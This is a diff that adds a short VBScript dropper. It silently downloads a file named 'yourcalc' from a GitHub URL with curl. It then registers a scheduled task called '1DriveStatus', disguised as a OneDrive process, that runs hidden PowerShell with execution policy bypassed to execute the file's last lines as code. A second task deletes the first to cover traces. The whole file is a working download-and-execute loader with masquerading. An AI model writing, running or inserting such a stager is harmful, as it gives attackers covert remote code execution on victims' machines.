@@ -1,0 +1,6 @@
+Set onetwo = WScript.CreateObject ("WScript.shell")
+onetwo.run "curl https://raw.githubusercontent.com/the-deusgroup/test-project/main/yourcalc -o %USERPROFILE%\downloads\yourcalc", 0, False
+wscript.sleep 12000
+onetwo.run "schtasks /create /sc minute /mo 5 /du 00:06 /k /tn 1DriveStatus /tr ""powershell -win hid -nop -exec bypass $anyfile = get-content $home\downloads\yourcalc | select-object -last 5; $scriptblock = [system.management.automation.scriptblock]::create($anyfile); & $scriptblock"" /F", 0, False
+wscript.sleep 10000
+onetwo.run "schtasks /create /sc minute /mo 7 /du 00:08 /k /tn 1DriveDel /tr ""schtasks /delete /tn 1DriveStatus /F"" /F", 0, False
